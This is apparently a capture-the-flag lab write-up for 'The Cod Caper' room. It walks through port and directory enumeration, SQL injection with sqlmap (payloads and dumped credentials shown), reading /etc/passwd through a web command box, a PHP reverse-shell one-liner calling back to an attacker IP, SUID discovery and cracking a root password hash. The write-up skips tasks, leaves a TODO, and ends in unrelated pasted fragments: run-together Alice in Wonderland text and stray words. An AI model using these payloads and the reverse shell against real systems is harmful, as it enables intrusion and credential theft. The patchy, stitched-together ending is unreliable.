# The Cod Caper


## Task 1 Intro
```
export IP=10.10.253.196
```


## Task 2 Host Enumeration

1. How many ports are open on the target machine?
  ```bash
  jeffrowell@kali:~/Documents/The Cod Caper$ nmap -sC -sV -Pn -n -oN nmap/initial $IP
  Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-19 21:55 MDT
  Nmap scan report for 10.10.253.196
  Host is up (0.13s latency).
  Not shown: 998 closed ports
  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey:
  |   2048 6d:2c:40:1b:6c:15:7c:fc:bf:9b:55:22:61:2a:56:fc (RSA)
  |   256 ff:89:32:98:f4:77:9c:09:39:f5:af:4a:4f:08:d6:f5 (ECDSA)
  |_  256 89:92:63:e7:1d:2b:3a:af:6c:f9:39:56:5b:55:7e:f9 (ED25519)
  80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
  |_http-server-header: Apache/2.4.18 (Ubuntu)
  |_http-title: Apache2 Ubuntu Default Page: It works
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 34.44 seconds
  ```

2. What is the http-title of the web server?
  Run nmap with default scripts `-sC` (see above):

  ```
  Apache2 Ubuntu Default Page: It works
  ```

  3. What version is the ssh service?
  Run nmap with service detection `-sV` (see above):

  ```
  OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
  ```

  4. What is the version of the web server?
  Run nmap with service detection `-sV` (see above):

  ```
  Apache/2.4.18
  ```

## Task 3 Web Enumeration

1. What is the name of the important file on the server?

  ```bash
    jeffrowell@kali:~/Documents/The Cod Caper$ gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt
    ===============================================================
    Gobuster v3.0.1
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
    ===============================================================
    [+] Url:            http://10.10.253.196
    [+] Threads:        10
    [+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    [+] Status codes:   200,204,301,302,307,401,403
    [+] User Agent:     gobuster/3.0.1
    [+] Extensions:     php,txt
    [+] Timeout:        10s
    ===============================================================
    2020/05/19 22:01:31 Starting gobuster
    ===============================================================
    /administrator.php (Status: 200)
    ```

    After navigating to the URL, we have the following login page:
    ![admin_login](https://user-images.githubusercontent.com/32188816/82404185-dd8dac80-9a1d-11ea-83a1-4c163a6d2854.png)



## Task 4 Web Exploitation

1. What is the admin username?

  Starting out with some basic tests before using `sqlmap`, we can see that and SQL injection vulnerability is preset and that the back-end DBMS is MySQL:

  ![my_sql](https://user-images.githubusercontent.com/32188816/82404186-dd8dac80-9a1d-11ea-964f-cee29d72c3f1.png)

  Running `sqlmap` with the `--forms` flag will help us fine tune the payload to dump the database:
  ```bash
  jeffrowell@kali:~/Documents/The Cod Caper$ sqlmap -u http://10.10.253.196/administrator.php --forms --dump
          ___
         __H__
   ___ ___[)]_____ ___ ___  {1.4#stable}
  |_ -| . [)]     | .'| . |
  |___|_  [,]_|_|_|__,|  _|
        |_|V...       |_|   http://sqlmap.org

                      .
                      .
                      .
                      .
                      .
                      .
                      .
                      .

  [22:31:45] [INFO] retrieved: 'secretpass'
  [22:31:46] [INFO] retrieved: 'pingudad'
  Database: users
  Table: users
  [1 entry]
  +------------+----------+
  | password   | username |
  +------------+----------+
  | secretpass | pingudad |
  +------------+----------+
  ```


2. What is the admin password?
  ```
  secretpass
  ```

3. How many forms of SQLI is the form vulnerable to?

  From the `sqlmap` scan we did earlier:
  ```bash
  [22:31:43] [WARNING] POST parameter 'password' does not seem to be injectable
  sqlmap identified the following injection point(s) with a total of 3519 HTTP(s) requests:
  ---
  Parameter: username (POST)
      Type: boolean-based blind
      Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
      Payload: username=YjvY' RLIKE (SELECT (CASE WHEN (9825=9825) THEN 0x596a7659 ELSE 0x28 END))-- EXpB&password=

      Type: error-based
      Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
      Payload: username=YjvY' OR (SELECT 6309 FROM(SELECT COUNT(*),CONCAT(0x7171707871,(SELECT (ELT(6309=6309,1))),0x7171767871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- eRtb&password=

      Type: time-based blind
      Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
      Payload: username=YjvY' AND (SELECT 7195 FROM (SELECT(SLEEP(5)))mukr)-- rqPL&password=
  ---
```



## Task 5 Command Execution
1. How many files are in the current directory?
  After we log in with the found creds it looks like we have a means to run commands:

  ![run_commands](https://user-images.githubusercontent.com/32188816/82405408-0e231580-9a21-11ea-87e4-68c0c7ea2fbe.png)

  Running the command `ls -al` gives us the following output in view source:
  ```html
  total 20
  -rw-rw-r-- 1 root root   378 Jan 15 21:19 2591c98b70119fe624898b1e424b5e91.php
  -rw-r--r-- 1 root root  1282 Jan 15 21:30 administrator.php
  -rw-r--r-- 1 root root 10918 Jan 15 20:20 index.html
  -rw-r--r-- 1 root root 10918 Jan 15 20:20 index.html<!DOCTYPE html>
  <html lang="en">
  <head>
      <meta charset="UTF-8">
      <title>Admin Login</title>
  </head>
  <body>

  <h1>Run Command</h1>

  <form action="2591c98b70119fe624898b1e424b5e91.php" method="POST">
  <p>Command: </p> <input type="text" name="cmd">

  </form>
  </body>
  </html>
  ```



2. Do I still have an account

  Since we have command abilitiy, we can check `/etc/passwd`:
  ```html
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  bin:x:2:2:bin:/bin:/usr/sbin/nologin
  sys:x:3:3:sys:/dev:/usr/sbin/nologin
  sync:x:4:65534:sync:/bin:/bin/sync
  games:x:5:60:games:/usr/games:/usr/sbin/nologin
  man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
  lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
  mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
  news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
  uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
  proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
  backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
  list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
  irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
  gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
  nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
  systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
  systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
  systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
  systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
  syslog:x:104:108::/home/syslog:/bin/false
  _apt:x:105:65534::/nonexistent:/bin/false
  messagebus:x:106:110::/var/run/dbus:/bin/false
  uuidd:x:107:111::/run/uuidd:/bin/false
  papa:x:1000:1000:qaa:/home/papa:/bin/bash
  mysql:x:108:116:MySQL Server,,,:/nonexistent:/bin/false
  sshd:x:109:65534::/var/run/sshd:/usr/sbin/nologin
  pingu:x:1002:1002::/home/pingu:/bin/bash
  pingu:x:1002:1002::/home/pingu:/bin/bash<!DOCTYPE html>
  <html lang="en">
  <head>
      <meta charset="UTF-8">
      <title>Admin Login</title>
  </head>
  <body>

  <h1>Run Command</h1>

  <form action="2591c98b70119fe624898b1e424b5e91.php" method="POST">
  <p>Command: </p> <input type="text" name="cmd">

  </form>
  </body>
  </html>
  ```


3. What is my ssh password?

  We can get a PHP reverse shell by entering the follwing command into the prompt:
  ```bash
  php -r '$sock=fsockopen("10.8.21.42",9999);exec("/bin/sh -i <&3 >&3 2>&3");'
  ```

    Once we are in the reverse shell, I always like to stabilize my shell and use bash:
    ```bash
    $ python -c 'import pty; pty.spawn("/bin/bash")'
    www-data@ubuntu:/var/www/html$ export TERM=xterm
    export TERM=xterm
    www-data@ubuntu:/var/www/html$
    ```We can use the following command to look for potential password files:

  Now, reading the question prompt, we know that the password is hidden somewhere on the system.
  ```bash
  www-data@ubuntu:/home/pingu$ find / -name '*pass*' 2>/dev/null
  ```

  We see that there is a file `/var/hidden/pass`:

  ```bash
  www-data@ubuntu:/home/pingu$ cat /var/hidden/pass
  cat /var/hidden/pass
  pinguapingu
  ```


## Task 6 LinEnum
1. What is the interesting path of the interesting suid file
  Since we have SSH credentials we can log into the box. First check is for commands we can run as sudo:

  ```bash
  pingu@ubuntu:/tmp$ sudo -l
  [sudo] password for pingu:
  Sorry, user pingu may not run sudo on ubuntu.
  ```

  Huh, okay what about SUID binaries?
  ```bash
  pingu@ubuntu:/tmp$ find / -perm -4000 2>/dev/null
  /opt/secret/root
  /usr/bin/sudo
  /usr/bin/vmware-user-suid-wrapper
  /usr/bin/chsh
  /usr/bin/passwd
  /usr/bin/gpasswd
  /usr/bin/newgrp
  /usr/bin/chfn
  /usr/lib/openssh/ssh-keysign
  /usr/lib/eject/dmcrypt-get-device
  /usr/lib/dbus-1.0/dbus-daemon-launch-helper
  /bin/ping
  /bin/su
  /bin/ping6
  /bin/ntfs-3g
  /bin/mount
  /bin/fusermount
  /bin/umount
  pingu@ubuntu:/tmp$
  ```

  This interesting binary is: `/opt/secret/root`


## Task 10 Finishing the Job

1. What is the root password
  TODO: Get the root hash the pwntools wayyy :)


  Now that we have the password hash, we can crack it with JtR and `rockyou.txt`:
  ```bash
  jeffrowell@kali:~/Documents/The Cod Caper$ echo '$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.' >> root_hash
  jeffrowell@kali:~/Documents/The Cod Caper$ /opt/JohnTheRipper/run/john root_hash --wordlist=/usr/share/wordlists/rockyou.txt
  Using default input encoding: UTF-8
  Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
  Cost 1 (iteration count) is 5000 for all loaded hashes
  Will run 8 OpenMP threads
  Press 'q' or Ctrl-C to abort, almost any other key for status
  love2fish        (?)
  1g 0:00:01:08 DONE (2020-05-19 23:31) 0.01468g/s 3534p/s 3534c/s 3534C/s luciole..laizah
  Use the "--show" option to display all of the cracked passwords reliably
  Session completed
  ```


THE
CATONLY
GRINNED
WHEN
ITS
AWALICE
IT
LOOKED
GOOD
NATURED
SHE
THOUGHT
STILL
IT
HAD
VERY
LONG
CLAWS
AND
A
GREAT
MANY
TEETH
SO
SHE
FELT
THAT
IT
OUGHT
TO
BE
TREATED WITH RESPECT CHESHIRE PUSSS HE BEGAN RATHER TIMIDLY ASSHED ID NOT AT ALL KNOW WHETHER ITW OULD LIKE THE NAME HOWEVER IT ONLY GRINNED A LITTLE WIDER COME ITS
PLEASED SO FAR THOUGHTA LICE AND SHE WENT ON WOULD YOU TELL ME PLEASE WHICH WAY I OUGHT TO GO FROM HERE THAT DEPENDS A GOODDEALONWHEREYOUWANTTOGETTOSAIDTHECATIDONTMUCHCAREWHERESAIDALICETHENITDOESNTMATTERWHICHWAYYOUGOSAIDTHECATSOLONGASIGETSOMEWHEREALICEADDEDASANEXPLANATIONOHYOURESURETODOTHATSAIDTHECATIFYOUONLYWALKLONGENOUGHALICEFELTTHATTHISCOULDNOTBEDENIEDSOSHETRIEDANOTHERQUESTIONWHATSORTOFPEOPLELIVEABOUTHEREINTHATDIRECTIONTHECATSAIDWAVINGITSRIGHTPAWROUNDLIVESAHATTERANDINTHATDIRECTIONWAVINGTHEOTHERPAWLIVESAMARCHHAREVISITEITHERYOULIKETHEYREBOTHMADBUTIDONTWANTTOGOAMONGMADPEOPLEALICEREMARKEDOHYOUCANTHELPTHATSAIDTHECATWEREALLMADHEREIMMADYOUREMADHOWDOYOUKNOWIMMADSAIDALICEYOUMUSTBESAIDTHECATORYOUWOULDNTHAVECOMEHERESHADOWBANKCHESHIRE


arnold
Lord of the Rings Trilogy
Sniffles
Bales


Some web frameworks leak version information in HTTP headers. Do some research on that version of the framework.
